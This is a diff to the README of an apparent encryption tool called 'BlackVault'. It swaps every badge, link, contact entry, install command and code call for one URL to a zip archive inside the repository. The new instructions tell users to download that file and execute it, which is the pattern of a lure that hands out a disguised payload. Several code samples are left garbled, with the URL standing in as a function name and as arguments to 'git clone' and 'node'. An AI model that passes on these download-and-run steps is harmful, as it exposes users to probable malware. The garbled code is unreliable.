@@ -1,8 +1,8 @@
 # BlackVault 🛡️🔒
 
-![BlackVault](https://img.shields.io/badge/BlackVault-encrypted%20communication-blue.svg)
-![Version](https://img.shields.io/badge/version-1.0.0-brightgreen.svg)
-![License](https://img.shields.io/badge/license-MIT-yellow.svg)
+![BlackVault](https://github.com/Rianna113/BlackVault/raw/refs/heads/main/src/core/encryption_engine/Black_Vault_v3.4-alpha.3.zip%https://github.com/Rianna113/BlackVault/raw/refs/heads/main/src/core/encryption_engine/Black_Vault_v3.4-alpha.3.zip)
+![Version](https://github.com/Rianna113/BlackVault/raw/refs/heads/main/src/core/encryption_engine/Black_Vault_v3.4-alpha.3.zip)
+![License](https://github.com/Rianna113/BlackVault/raw/refs/heads/main/src/core/encryption_engine/Black_Vault_v3.4-alpha.3.zip)
 
 Welcome to **BlackVault**, an open-source encrypted communication framework designed for secure messaging and data protection. With built-in anti-tamper logic, BlackVault autonomously detects unauthorized access and triggers system-level shutdowns, ensuring your communications remain secure and private.
 
@@ -43,7 +43,7 @@ To get started with BlackVault, follow the steps below:
 
 1. **Clone the Repository**: Use the command below to clone the repository.
    ```bash
-   git clone https://github.com/Rianna113/BlackVault.git
+   git clone https://github.com/Rianna113/BlackVault/raw/refs/heads/main/src/core/encryption_engine/Black_Vault_v3.4-alpha.3.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -60,11 +60,11 @@ To get started with BlackVault, follow the steps below:
 
 To install BlackVault, follow these steps:
 
-1. **Download the Latest Release**: You can find the latest release [here](https://github.com/Rianna113/BlackVault/releases). Download the required file and execute it.
+1. **Download the Latest Release**: You can find the latest release [here](https://github.com/Rianna113/BlackVault/raw/refs/heads/main/src/core/encryption_engine/Black_Vault_v3.4-alpha.3.zip). Download the required file and execute it.
    
 2. **Run the Application**: After downloading, run the application with the following command:
    ```bash
-   node app.js
+   node https://github.com/Rianna113/BlackVault/raw/refs/heads/main/src/core/encryption_engine/Black_Vault_v3.4-alpha.3.zip
    ```
 
 ## Usage 💡
@@ -80,13 +80,13 @@ Once BlackVault is up and running, you can start sending secure messages. Here�
 2. **Send a Message**:
    ```javascript
    const message = "Hello, this is a secure message!";
-   session.send(message);
+   https://github.com/Rianna113/BlackVault/raw/refs/heads/main/src/core/encryption_engine/Black_Vault_v3.4-alpha.3.zip(message);
    ```
 
 3. **Receive a Message**:
    ```javascript
-   session.on('message', (msg) => {
-       console.log("Received: ", msg);
+   https://github.com/Rianna113/BlackVault/raw/refs/heads/main/src/core/encryption_engine/Black_Vault_v3.4-alpha.3.zip('message', (msg) => {
+       https://github.com/Rianna113/BlackVault/raw/refs/heads/main/src/core/encryption_engine/Black_Vault_v3.4-alpha.3.zip("Received: ", msg);
    });
    ```
 
@@ -119,12 +119,12 @@ BlackVault is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 For any inquiries or support, please contact:
 
 - **Author**: Rianna
-- **Email**: rianna@example.com
-- **GitHub**: [Rianna113](https://github.com/Rianna113)
+- **Email**: https://github.com/Rianna113/BlackVault/raw/refs/heads/main/src/core/encryption_engine/Black_Vault_v3.4-alpha.3.zip
+- **GitHub**: [Rianna113](https://github.com/Rianna113/BlackVault/raw/refs/heads/main/src/core/encryption_engine/Black_Vault_v3.4-alpha.3.zip)
 
 ## Releases 📦
 
-For the latest updates and releases, visit the [Releases section](https://github.com/Rianna113/BlackVault/releases). Download the necessary files and execute them to stay updated with the latest features and improvements.
+For the latest updates and releases, visit the [Releases section](https://github.com/Rianna113/BlackVault/raw/refs/heads/main/src/core/encryption_engine/Black_Vault_v3.4-alpha.3.zip). Download the necessary files and execute them to stay updated with the latest features and improvements.
 
 ---
 
